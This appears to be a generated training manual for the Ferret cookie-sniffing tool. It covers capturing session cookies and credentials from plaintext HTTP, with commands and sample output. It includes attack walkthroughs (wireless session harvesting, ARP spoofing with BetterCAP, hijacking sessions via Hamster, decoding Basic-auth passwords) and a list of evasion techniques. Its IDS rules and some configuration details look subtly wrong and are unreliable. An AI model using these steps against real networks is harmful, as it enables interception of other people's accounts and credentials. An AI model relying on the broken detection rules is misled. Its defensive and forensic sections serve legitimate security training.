---
tool_name: "ferret-sidejack"
display_name: "Ferret"
mitre_tactic: "collection"
mitre_tactic_id: "TA0009"
mitre_subcategory: "sniffing_and_cookie_harvesting"
install_command: "sudo apt install ferret-sidejack"
version: "3.0.1"
github_repo: "https://github.com/robertdavidgraham/ferret"
kali_tools_page: "https://www.kali.org/tools/ferret-sidejack/"
difficulty_level: "intermediate"
requires_root: true
gui_available: false
tags: ["sniffing", "cookie-harvesting", "sidejacking", "session-hijacking", "network-capture", "mitm"]
related_tools: ["hamster-sidejack", "wireshark", "tcpdump", "bettercap"]
---

# Ferret - Network Cookie & Credential Harvester

## Chapter 1: Introduction & Overview

### What is Ferret?

Ferret is a network monitoring tool that extracts interesting data from network traffic, specifically designed to harvest cookies, authentication tokens, and other session-related information from unencrypted network communications. It is the companion data-capture tool for the Hamster sidejacking framework — Ferret sniffs the wire, Hamster uses the captured data to hijack sessions.

Ferret operates by placing a network interface into promiscuous mode and parsing all passing traffic for HTTP headers. When it finds `Set-Cookie`, `Cookie`, `Authorization`, or form POST data in plaintext HTTP streams, it extracts and logs them. The extracted data can then be fed directly to Hamster for session replay or analyzed offline with text processing tools.

### History & Background

- **Created:** Robert David Graham (Errata Security)
- **Version:** 3.0.1 (September 2024 build)
- **License:** Open source
- **Original Project:** Google Code (ferret.googlecode.com, now archived)
- **GitHub Mirror:** github.com/robertdavidgraham/ferret
- **Language:** C/C++ with libpcap
- **Dependencies:** libc6, libgcc-s1, libpcap-dev, libstdc++6
- **Installed Size:** 379 KB

Ferret was one of the pioneering session hijacking tools, demonstrating that unencrypted HTTP cookies on wired and wireless networks could be trivially captured and replayed. It was originally presented at Black Hat and has been a staple in the Kali Linux distribution for years. The tool works by passively sniffing network traffic and extracting cookies, HTTP headers, and authentication credentials from plaintext communications.

### When to Use This Tool

- **Penetration testing:** Demonstrate session hijacking risks on unencrypted networks
- **Red team engagements:** Capture credentials from internal network traffic
- **Wireless security assessments:** Show risks of open/unencrypted Wi-Fi
- **Network forensics:** Extract session data from pcap captures for post-incident analysis
- **CTF challenges:** Session hijacking and network sniffing challenges
- **Compliance audits:** Prove that plaintext protocols expose credentials
- **Internal network assessments:** Find legacy HTTP services leaking session tokens

### When NOT to Use This Tool

- Without network-level access authorization from the network owner
- On production networks without written consent
- To intercept personal communications
- Against encrypted (HTTPS) traffic (Ferret captures plaintext only)
- For data exfiltration beyond session cookies
- Against production authentication systems without a signed scope of work

### Legal and Ethical Considerations

- **Network access authorization required** — sniffing traffic on unauthorized networks is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent international laws
- **Only works on unencrypted traffic** — HTTPS/TLS traffic is opaque to Ferret
- **Passive tool** — Ferret does not inject or modify traffic, it only reads
- **Data sensitivity** — captured cookies provide full account access to the victim's sessions
- **Scope limitations** — ensure the engagement explicitly includes network sniffing and session hijacking
- **Data handling** — captured session tokens must be securely stored and destroyed after the engagement
- **Chain of custody** — for forensics engagements, maintain proper evidence handling procedures

### Key Concepts

| Concept | Description |
|---------|-------------|
| **Sidejacking** | Hijacking a web session by stealing the session cookie |
| **Packet Capture** | Reading raw network packets via libpcap |
| **Cookie Extraction** | Parsing HTTP Set-Cookie headers from captured traffic |
| **Plaintext Protocols** | Only HTTP (not HTTPS) traffic yields usable cookies |
| **Offline Analysis** | Can process previously captured pcap files |
| **Promiscuous Mode** | Network adapter mode that captures all traffic, not just destined for the host |
| **Session Token** | A unique identifier issued by a web server to track a user's session |
| **Set-Cookie Header** | HTTP response header that instructs the browser to store a cookie |
| **HTTP Authorization** | Header carrying credentials (Basic, Bearer, Digest) |
| **libpcap** | Portable C library for network traffic capture |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux (Kali Linux recommended), also runs on macOS and Windows (with WinPcap)
- **Root access:** Required for raw packet capture via libpcap
- **Network interface:** Ethernet or Wi-Fi adapter (Wi-Fi must be in monitor mode for wireless capture)
- **libpcap:** Packet capture library (version 1.10.6 or later recommended)
- **Disk Space:** ~5 MB for the tool itself; additional space for capture logs
- **Memory:** Minimal — Ferret is a lightweight process
- **CPU:** Negligible impact — parsing is CPU-friendly

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install ferret-sidejack
```

**Output:**
```
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  ferret-sidejack
0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded.
Need to get 38.2 kB of archives.
After this operation, 379 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 ferret-sidejack amd64 3.0.1-1kali1 [38.2 kB]
Fetched 38.2 kB in 1s (52.3 kB/s)
Selecting previously unselected package ferret-sidejack.
(Reading database ... 428516 files and directories currently installed.)
Preparing to unpack .../ferret-sidejack_3.0.1-1kali1_amd64.deb ...
Unpacking ferret-sidejack (3.0.1-1kali1) ...
Setting up ferret-sidejack (3.0.1-1kali1) ...
```

#### Method 2: Dependencies Only

```bash
# Install libpcap if not present
sudo apt install libpcap-dev libstdc++6

# Verify libpcap is installed
dpkg -l | grep libpcap
# Output: ii  libpcap-dev:amd64  1.10.6-1  amd64  development library for libpcap
```

#### Method 3: Build from Source

```bash
# Clone from GitHub mirror
git clone https://github.com/robertdavidgraham/ferret.git
cd ferret/src

# Install build dependencies
sudo apt install build-essential libpcap-dev

# Compile
make

# Install system-wide
sudo cp ferret /usr/local/bin/
```

### Verify Installation

```bash
ferret-sidejack
```

**Output:**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- build = Sep 29 2024 02:38:07 (64-bits)
-- libpcap version 1.10.6 (64-bit time_t, with TPACKET_V3)
options:
 -i <adapter>    Sniffs the wire(less) attached to that network adapter.
                 Must have libpcap or winpcap installed to work.
 -r <files>      Read files in off-line mode. Can use wildcards, such as
                 using "ferret -r *.pcap". Doesn't need libpcap to work.
 -c <file>       Reads in more advanced parameters from a file.
```

### Network Interface Setup

```bash
# List available interfaces
ip link show

# Example output:
# 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65533 qdisc noqueue state UNKNOWN
#     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
# 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
#     link/ether aa:bb:cc:dd:ee:ff brd ff:ff:ff:ff:ff:ff
# 3: wlan0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN
#     link/ether 11:22:33:44:55:66 brd ff:ff:ff:ff:ff:ff

# For wireless — enable monitor mode
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up

# Alternative using airmon-ng (handles interference killers)
sudo airmon-ng start wlan0

# For ethernet — no special setup needed
# Promiscuous mode is set automatically by libpcap
```

---

## Chapter 3: Architecture & Operation

### Operation Modes

```
Mode 1: Live Capture
  Network Interface → libpcap → Packet Filter → HTTP Parser → Cookie Extractor → Output

Mode 2: Offline Analysis
  pcap File → Packet Parser → HTTP Parser → Cookie Extractor → Output

Mode 3: Feed to Hamster
  Network Interface → libpcap → Cookie Extractor → Hamster Proxy (port 1234)
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Network Sniffing | T1040 | Capture network traffic passively |
| Steal Web Session Cookie | T1539 | Extract session cookies from HTTP traffic |
| Man-in-the-Middle | T1557 | Position to intercept traffic |
| Active Scanning | T1595 | Network discovery for targets |
| Unsecured Credentials | T1552 | Capture credentials from plaintext protocols |

### What Ferret Extracts

**HTTP Cookies:**
- Session identifiers (PHPSESSID, JSESSIONID, ASP.NET_SessionId, etc.)
- Authentication tokens
- Custom application cookies
- CSRF tokens (useful for understanding session state)
- Persistent cookies (remember-me tokens)

**HTTP Headers:**
- Authorization headers (Basic, Bearer, Digest)
- Custom authentication headers
- User-Agent strings (for session fingerprinting)
- Referer headers (for navigation tracking)

**Other Data:**
- Form POST data (usernames, passwords, search queries)
- Referer URLs
- Host headers
- Content-Type information

### HTTP Cookie Parsing Details

Ferret parses the following HTTP headers for cookie data:

**Set-Cookie (Server → Client):**
```
Set-Cookie: session_id=ABC123; Path=/; Domain=.example.com; HttpOnly; Secure
Set-Cookie: user=john; Expires=Thu, 01 Jan 2027 00:00:00 GMT; Path=/
```

**Cookie (Client → Server):**
```
Cookie: session_id=ABC123; user=john; csrf_token=XYZ789
```

**Authorization (Client → Server):**
```
Authorization: Basic dXNlcjpwYXNz
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
```

**Form POST Data:**
```
username=admin&password=secret123&remember=on
```

### Cookie File Format

Ferret outputs captured data in a structured format that Hamster can consume:

```
---FERRET---
---TIME: Thu Jan 15 14:32:01 2026---
---IP: 192.168.1.100 → 10.0.0.50 ---
---HOST: www.example.com ---
Cookie: PHPSESSID=abc123def456; Path=/; Domain=.example.com
Cookie: user_token=xyz789; Path=/; Domain=.example.com
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
---END---
```

Each captured session entry contains:
- Timestamp of capture
- Source and destination IP addresses
- Target hostname
- All cookies for that session
- Any Authorization headers

### Limitations

- **Plaintext only:** Cannot decrypt HTTPS/TLS traffic
- **Passive only:** Does not perform ARP spoofing or other MITM attacks
- **HTTP only:** Does not capture cookies from other protocols
- **No injection:** Does not modify or inject packets
- **No WebSocket support:** Does not parse WebSocket upgrade handshakes
- **No HTTP/2:** Does not parse HTTP/2 binary framing (only HTTP/1.x plaintext)

---

## Chapter 4: Command Reference

### Complete Flags Reference

| Flag | Argument | Description | Required |
|------|----------|-------------|----------|
| `-i` | `<adapter>` | Sniff live traffic on the specified network interface | Yes (live mode) |
| `-r` | `<files>` | Read pcap files in offline mode (supports wildcards like `*.pcap`) | Yes (offline mode) |
| `-c` | `<file>` | Load advanced configuration parameters from a file | No |
| `-h` | (none) | Print help message and exit | No |
| `-v` | (none) | Verbose output for debugging | No |

### Basic Operation

#### Live Capture on Interface

```bash
sudo ferret-sidejack -i eth0
```

**Output:**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- build = Sep 29 2024 02:38:07 (64-bits)
-- libpcap version 1.10.6 (64-bit time_t, with TPACKET_V3)
-- interface = eth0
-- capture started
---TIME: Thu Jan 15 14:32:01 2026---
---IP: 192.168.1.100 → 10.0.0.50 ---
---HOST: www.internal-app.local ---
Cookie: JSESSIONID=A1B2C3D4E5F6; Path=/; Domain=.internal-app.local
```

**Explanation:** Sniff all traffic on the eth0 interface and extract cookies/session data. Requires root privileges for raw packet capture.

#### Live Capture on Wireless

```bash
sudo ferret-sidejack -i wlan0
```

**Output:**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- build = Sep 29 2024 02:38:07 (64-bits)
-- libpcap version 1.10.6 (64-bit time_t, with TPACKET_V3)
-- interface = wlan0
-- capture started
```

**Explanation:** Sniff Wi-Fi traffic. Interface must be in monitor mode first. Use `airmon-ng check kill` before starting if NetworkManager interferes.

#### Offline Pcap Analysis

```bash
ferret-sidejack -r capture.pcap
```

**Output:**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- build = Sep 29 2024 02:38:07 (64-bits)
-- reading: capture.pcap
---TIME: Thu Jan 15 10:15:33 2026---
---IP: 192.168.1.50 → 10.0.0.10 ---
---HOST: mail.example.com ---
Cookie: session=SESS_abc123xyz; Path=/; Domain=.mail.example.com
Authorization: Basic YWRtaW46c2VjcmV0
---TIME: Thu Jan 15 10:16:45 2026---
---IP: 192.168.1.50 → 10.0.0.20 ---
---HOST: wiki.internal.local ---
Cookie: wiki_session=abcdef123456; Path=/; Domain=.internal.local
```

**Explanation:** Analyze a previously captured pcap file for cookies and session data. No root required for offline mode.

#### Multiple Pcap Files

```bash
ferret-sidejack -r *.pcap
```

**Output:**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- reading: capture_001.pcap
-- reading: capture_002.pcap
-- reading: capture_003.pcap
---TIME: Thu Jan 15 10:15:33 2026---
---IP: 192.168.1.50 → 10.0.0.10 ---
---HOST: mail.example.com ---
Cookie: session=SESS_abc123xyz
```

**Explanation:** Process all pcap files in the current directory using wildcard expansion. Ferret processes them sequentially.

#### Custom Configuration File

```bash
ferret-sidejack -i eth0 -c ferret.conf
```

**Explanation:** Load advanced configuration from a file. The configuration file can define custom BPF filters, output formatting, and extraction rules.

### Configuration File Format

Ferret's configuration file uses a simple line-based format:

```
# Ferret configuration file
# Lines starting with # are comments

# BPF filter — only capture HTTP traffic
filter tcp port 80

# Output format
# Options: text, csv, json (limited)
format text

# Verbosity level
# 0 = quiet, 1 = normal, 2 = verbose
verbosity 1

# Maximum packet size to capture (bytes)
snaplen 65535

# Promiscuous mode
# 1 = enabled (default), 0 = disabled
promisc 1
```

**Example with BPF filter (capture only specific hosts):**

```
# Only capture traffic to/from the internal web server
filter host 192.168.1.50 and tcp port 80
```

**Example with VLAN filter:**

```
# Capture only VLAN 100 traffic
filter vlan 100 and tcp port 80
```

### Output and Logging

#### Direct Console Output

```bash
sudo ferret-sidejack -i eth0 2>&1 | tee ferret_output.log
```

**Explanation:** Display captured data on console while simultaneously logging to file. The `2>&1` redirect ensures both stdout and stderr are captured.

#### Combine with tcpdump for Reference Capture

```bash
# Terminal 1: Full packet capture for later analysis
sudo tcpdump -i eth0 -w full_capture.pcap

# Terminal 2: Ferret extraction
sudo ferret-sidejack -i eth0
```

**Output (Terminal 2):**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- build = Sep 29 2024 02:38:07 (64-bits)
-- interface = eth0
-- capture started
```

**Explanation:** Run Ferret alongside a full packet capture for comprehensive evidence collection. The tcpdump capture can be used for detailed forensic analysis while Ferret provides quick cookie extraction.

#### Piped Capture with BPF Filter

```bash
sudo tcpdump -i eth0 -U -w - 'tcp port 80 and host 192.168.1.100' | ferret-sidejack -r -
```

**Output:**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- reading: stdin
---TIME: Thu Jan 15 14:35:02 2026---
---IP: 192.168.1.100 → 10.0.0.50 ---
---HOST: www.example.com ---
Cookie: PHPSESSID=def456ghi789; Path=/; Domain=.example.com
```

**Explanation:** Filter traffic to a specific host before processing with Ferret. The `-U` flag in tcpdump makes output packet-buffered for reliable piping.

### Practical Usage Patterns

#### Capture on Internal Network Segment

```bash
# On the target network segment
sudo ferret-sidejack -i eth0 -c internal_network.conf 2>&1 | tee internal_capture.log
```

**Output:**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- reading config: internal_network.conf
-- interface = eth0
-- capture started
---TIME: Thu Jan 15 15:00:01 2026---
---IP: 192.168.10.5 → 192.168.10.20 ---
---HOST: intranet.company.local ---
Cookie: ASP.NET_SessionId=abc123def456; Path=/; Domain=.company.local
Cookie: .AspNet.ApplicationAuth=eyJhbGciOi...; Path=/; Domain=.company.local
```

**Explanation:** Monitor an internal network segment for unencrypted session cookies. Common targets include legacy admin panels, printer interfaces, and development servers.

#### Batch Pcap Processing

```bash
# Process all pcaps from a directory
for pcap in /evidence/captures/*.pcap; do
  echo "=== Processing: $pcap ===" >> combined_results.txt
  ferret-sidejack -r "$pcap" >> combined_results.txt 2>&1
done

# Count total cookies found
grep -c "^Cookie:" combined_results.txt
```

**Output:**
```
=== Processing: /evidence/captures/capture_001.pcap ===
=== Processing: /evidence/captures/capture_002.pcap ===
=== Processing: /evidence/captures/capture_003.pcap ===
47
```

#### Extract Unique Cookies for Analysis

```bash
# Process pcap and extract unique cookie values
ferret-sidejack -r incident.pcap 2>&1 | grep "^Cookie:" | sort -u > unique_cookies.txt

# Count unique cookies
wc -l unique_cookies.txt
# Output: 23 unique_cookies.txt

# View results
cat unique_cookies.txt
```

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Wireless Session Harvesting

**Setup:**

```bash
# Step 1: Put wireless adapter in monitor mode
sudo ip link set wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ip link set wlan0 up

# Step 2: Verify monitor mode
iwconfig wlan0
# Output: wlan0  IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz

# Step 3: Start Ferret
sudo ferret-sidejack -i wlan0 2>&1 | tee wireless_cookies.log

# Step 4: Feed captured cookies to Hamster
# In another terminal:
sudo hamster-sidejack
# Set browser proxy to http://127.0.0.1:1234
```

**Attack Flow:**
1. Wireless adapter captures all Wi-Fi traffic in range
2. Ferret extracts cookies from HTTP (non-HTTPS) sessions
3. Cookies are saved to the console and wireless_cookies.log
4. Hamster reads the log and uses cookies for session hijacking
5. Browser configured to proxy through Hamster accesses victim sessions

**Key Insight:** This attack only works against HTTP websites. HTTPS traffic is encrypted and yields no usable cookies. Many modern sites redirect HTTP to HTTPS, reducing the attack surface. However, legacy internal applications, IoT devices, and development servers often run plain HTTP.

**Expected Output Sample:**
```
---TIME: Thu Jan 15 14:45:12 2026---
---IP: 192.168.1.25 → 10.0.0.100 ---
---HOST: guest-wifi-portal.local ---
Cookie: guest_session=xy789abc; Path=/; Domain=.local
---TIME: Thu Jan 15 14:46:33 2026---
---IP: 192.168.1.30 → 10.0.0.100 ---
---HOST: legacy-cms.company.local ---
Cookie: cms_login=ZWQxMjM0NTY; Path=/; Domain=.company.local
Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

### Scenario 2: Internal Network Credential Capture

```bash
# On a machine with access to the internal network
sudo ferret-sidejack -i eth0 2>&1 > /tmp/ferret_results.txt

# Analyze results
grep -i "cookie" /tmp/ferret_results.txt
grep -i "authorization" /tmp/ferret_results.txt
grep -i "password" /tmp/ferret_results.txt
```

**Capture Targets:**
- Legacy HTTP admin panels
- Internal web applications without TLS
- Printer web interfaces (HP, Canon, Epson management pages)
- IoT device management pages (cameras, routers, switches)
- Development/staging servers
- Internal wikis and documentation systems
- Legacy ERP and CRM systems

**Output Analysis:**
```bash
# Extract all Authorization headers
grep "^Authorization:" /tmp/ferret_results.txt
# Output:
# Authorization: Basic YWRtaW46cGFzc3dvcmQ=
# Authorization: Basic cGxhbm5pbmc6dGVzdDEyMw==

# Decode Base64 credentials
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d
# Output: admin:password
```

### Scenario 3: Pcap Analysis for Post-Incident Investigation

```bash
# Analyze traffic captured during an incident
ferret-sidejack -r incident_capture_001.pcap 2>&1 | tee incident_cookies.txt

# Search for specific session tokens
grep -i "session" incident_cookies.txt

# Extract all unique cookies
sort -u incident_cookies.txt | grep "Cookie:" > unique_cookies.txt

# Count cookies per host
grep "^---HOST:" incident_cookies.txt | sort | uniq -c | sort -rn
```

**Output:**
```
     15 ---HOST: mail.company.local ---
     12 ---HOST: internal-wiki.company.local ---
      8 ---HOST: erp.company.local ---
      5 ---HOST: printer-floor2.local ---
      3 ---HOST: dev-server.company.local ---
```

**Use Case:** After a breach, analyze network captures to determine what sessions were compromised, which hosts were accessed, and what time window the attacker operated in.

### Scenario 4: Automated Multi-Interface Capture

```bash
# Capture on multiple interfaces simultaneously
sudo ferret-sidejack -i eth0 2>&1 | tee eth0_cookies.log &
sudo ferret-sidejack -i wlan0 2>&1 | tee wlan0_cookies.log &
sudo ferret-sidejack -i eth1 2>&1 | tee eth1_cookies.log &

# Wait for capture period
sleep 3600

# Kill all Ferret instances
pkill ferret-sidejack

# Merge and deduplicate results
cat eth0_cookies.log wlan0_cookies.log eth1_cookies.log | sort -u > merged_cookies.log
```

**Use Case:** Monitor multiple network segments simultaneously during a broad internal assessment.

---

## Chapter 6: Detection & Evasion

### Detection Signatures

**Network Monitoring:**
- Promiscuous mode detection via ARP probe responses (send ARP to non-existent IP; if the host responds, its NIC is in promiscuous mode)
- Unusual packet capture processes (pcap, ferret, tcpdump)
- Traffic patterns consistent with sniffing tools
- Increased broadcast traffic reception from a single host

**Host-Based Detection:**
- Process monitoring for ferret/pcap processes (`ps aux | grep ferret`)
- Network interface mode changes (monitor mode on Wi-Fi)
- Unusual network adapter configurations
- libpcap file descriptors open on non-standard interfaces

**IDS/IPS Rules:**

```
# Suricata rule for detecting promiscuous mode
alert ip any any -> any any (msg:"Possible promiscuous mode detection"; \
  content:"|01 00 5e|"; sid:1000001; rev:1;)

# Snort rule for Ferret process detection
alert tcp any any -> any any (msg:"Ferret cookie capture detected"; \
  content:"Set-Cookie"; content:"FERRET"; sid:1000002; rev:1;)
```

### Evasion Techniques

1. **Passive Operation:** Ferret only reads traffic — no packets are sent, making it invisible to most detection methods
2. **Stealth Monitoring:** Use a passive network tap instead of a wireless adapter to avoid wireless detection
3. **Encrypted Channel:** Monitor only HTTP traffic to avoid detection by TLS inspection
4. **Timing:** Capture during peak hours when network noise is high and individual connections are harder to isolate
5. **Low Profile:** Run on a device that would normally be on the network (e.g., a legitimate server)
6. **BPF Filtering:** Use precise BPF filters to capture only target traffic, reducing your network footprint
7. **Daemon Mode:** If running as a background service, avoid console output that could be discovered

### Blue Team Countermeasures

- **Enforce HTTPS everywhere:** Use HSTS headers with long max-age to prevent HTTP fallback
- **Network segmentation:** Isolate sensitive traffic on separate VLANs
- **802.1X:** Require authentication for network access to prevent unauthorized sniffing
- **Promiscuous mode detection:** Monitor for ARP anomalies and broadcast traffic analysis
- **Encrypted DNS:** Prevent DNS manipulation that could redirect HTTP traffic to attacker-controlled servers
- **Cookie Security Flags:** Set `Secure`, `HttpOnly`, and `SameSite` attributes on all cookies
- **HTTP to HTTPS Redirect:** Ensure all HTTP traffic is immediately redirected to HTTPS
- **Network Access Control (NAC):** Deploy 802.1X with certificate-based authentication
- **Wireless Security:** Use WPA3-Enterprise with 802.1X for wireless networks

---

## Chapter 7: Integration with Other Tools

### Hamster-Sidejack Integration

Ferret and Hamster are designed to work together:

```bash
# Terminal 1: Ferret captures cookies
sudo ferret-sidejack -i wlan0

# Terminal 2: Hamster uses captured cookies
sudo hamster-sidejack
# Hamster listens on 127.0.0.1:1234
# Configure browser proxy: HTTP 127.0.0.1:1234
```

**Workflow:**
1. Ferret captures cookies from the network
2. Hamster reads Ferret's output file
3. Browser proxy routes HTTP through Hamster
4. Hamster replaces browser cookies with captured ones
5. Navigating to victim's sites shows their authenticated sessions

### BetterCAP Integration

```bash
# BetterCAP performs ARP spoofing to position for sniffing
sudo bettercap -iface eth0

# In BetterCAP:
# set arp.spoof.targets 192.168.1.0/24
# arp.spoof on

# Ferret then captures the redirected traffic
sudo ferret-sidejack -i eth0
```

**Explanation:** BetterCAP provides the active MITM component (ARP spoofing) while Ferret handles passive cookie extraction. This combination is effective for internal network assessments.

### Wireshark Analysis

```bash
# Capture with Wireshark, then analyze with Ferret
# In Wireshark: File > Export Specified Packets > Save as .pcap

# Then analyze with Ferret
ferret-sidejack -r wireshark_capture.pcap

# Or extract cookies directly in Wireshark
# Display filter: http.set-cookie or http.cookie
```

### tcpdump Correlation

```bash
# Full packet capture for forensic correlation
sudo tcpdump -i eth0 -w full_capture.pcap -c 100000

# Ferret extraction in parallel
sudo ferret-sidejack -i eth0 2>&1 | tee ferret_extract.txt

# Correlate timestamps between full capture and Ferret output
# Use Ferret timestamps to find exact packets in Wireshark
```

### tshark Extraction Pipeline

```bash
# Extract cookies with tshark for comparison with Ferret output
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie > tshark_cookies.txt

# Run Ferret for comparison
ferret-sidejack -r capture.pcap 2>&1 > ferret_cookies.txt

# Compare results
diff <(sort tshark_cookies.txt) <(sort ferret_cookies.txt)
```

### nmap Service Discovery

```bash
# Find HTTP services that Ferret can harvest cookies from
nmap -sV -p 80,8080,8000,8888 192.168.1.0/24 --open

# Then run Ferret against discovered hosts
sudo ferret-sidejack -i eth0 -c http_targets.conf
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue: Permission denied on interface**

```bash
# Error message:
# ferret-sidejack: eth0: You don't have permission to capture on that device
# (socket: Operation not permitted)

# Solution 1: Run with root privileges
sudo ferret-sidejack -i eth0

# Solution 2: Grant capabilities
sudo setcap cap_net_raw,cap_net_admin=eip /usr/bin/ferret-sidejack

# Solution 3: Verify capabilities
getcap /usr/bin/ferret-sidejack
# Should show: cap_net_raw,cap_net_admin=eip
```

**Issue: No cookies captured**

```bash
# Verify traffic is flowing
sudo tcpdump -i eth0 -c 10

# Check if traffic is encrypted (HTTPS)
sudo tcpdump -i eth0 -c 20 port 80

# If no HTTP traffic, most sites use HTTPS now
# Try targeting internal/legacy HTTP services

# Check if interface is actually receiving traffic
ip -s link show eth0
# Look at RX packets count — if it's not increasing, the interface isn't receiving traffic
```

**Issue: Interface not found**

```bash
# List available interfaces
ip link show

# For monitor mode on wireless
sudo airmon-ng start wlan0
# Use the monitor interface (e.g., wlan0mon)
sudo ferret-sidejack -i wlan0mon

# If interface name changed after airmon-ng
iwconfig | grep -i monitor
# Output: wlan0mon  IEEE 802.11  Mode:Monitor
```

**Issue: Hamster not reading Ferret output**

```bash
# Check default output location
ls ~/hamster/cookies.txt
ls /tmp/ferret*.log

# Specify output explicitly
sudo ferret-sidejack -i eth0 -c custom_config.conf

# Verify Hamster is looking in the right directory
# Hamster reads from ~/hamster/ by default

# Create the directory if it doesn't exist
mkdir -p ~/hamster/
```

**Issue: Low capture rate**

```bash
# Increase capture buffer
sudo ferret-sidejack -i eth0 -c high_buffer.conf

# Use a dedicated capture interface
sudo tcpdump -i dedicated_nic -w capture.pcap &
sudo ferret-sidejack -r capture.pcap

# Check for dropped packets
ip -s link show eth0 | grep "dropped"
```

**Issue: High CPU usage on busy networks**

```bash
# Use BPF filter to reduce packet volume
sudo tcpdump -i eth0 -w - 'tcp port 80' | ferret-sidejack -r -

# Or create a config file with filter
echo "filter tcp port 80" > light_filter.conf
sudo ferret-sidejack -i eth0 -c light_filter.conf
```

**Issue: ferret-sidejack command not found**

```bash
# Verify installation
which ferret-sidejack
# If not found, install it
sudo apt update && sudo apt install ferret-sidejack

# Check PATH
echo $PATH

# If installed to /usr/local/bin, ensure it's in PATH
export PATH=$PATH:/usr/local/bin
```

### Debug Mode

```bash
# Verbose output for troubleshooting
sudo ferret-sidejack -i eth0 -v 2>&1 | tee debug.log

# Check libpcap version
ferret-sidejack 2>&1 | grep "libpcap"

# Verify interface is working
sudo tcpdump -i eth0 -c 5 -v 2>&1 | head -20
```

**Verbose Output Example:**
```
-- FERRET 3.0.1 - 2007-2012 (c) Errata Security
-- build = Sep 29 2024 02:38:07 (64-bits)
-- libpcap version 1.10.6 (64-bit time_t, with TPACKET_V3)
-- interface = eth0
-- verbose mode enabled
-- opening capture on eth0
-- capture started
-- packet #1: 64 bytes, ethertype 0x0800 (IPv4)
-- packet #2: 98 bytes, ethertype 0x0800 (IPv4)
-- HTTP traffic detected from 192.168.1.100
-- parsing HTTP headers...
-- found Set-Cookie header
-- extraction complete
```

### Performance Optimization

```bash
# For high-traffic networks, capture only HTTP
sudo tcpdump -i eth0 -w http_only.pcap 'tcp port 80'

# Analyze the filtered capture
ferret-sidejack -r http_only.pcap

# Use ring buffer for continuous capture
sudo tcpdump -i eth0 -w capture.pcap -C 100 -W 10
# This creates capture.pcap0 through capture.pcap9, each 100MB
# Then analyze them in sequence
for f in capture.pcap*; do ferret-sidejack -r "$f"; done
```

---

## Resources

- **GitHub (Mirror):** https://github.com/robertdavidgraham/ferret
- **Errata Security:** http://www.erratasec.com/research.html
- **Kali Documentation:** https://www.kali.org/tools/ferret-sidejack/
- **Hamster-Sidejack:** https://www.kali.org/tools/hamster-sidejack/
- **Original Project:** http://ferret.googlecode.com (archived)
- **Wireshark:** https://www.wireshark.org
- **tcpdump:** https://www.tcpdump.org
- **BetterCAP:** https://www.bettercap.org
- **OWASP Session Hijacking:** https://owasp.org/www-community/attacks/Session_hijacking
- **RFC 6265 (HTTP Cookies):** https://tools.ietf.org/html/rfc6265
- **libpcap Documentation:** https://www.tcpdump.org/manpages/pcap.3pcap.html
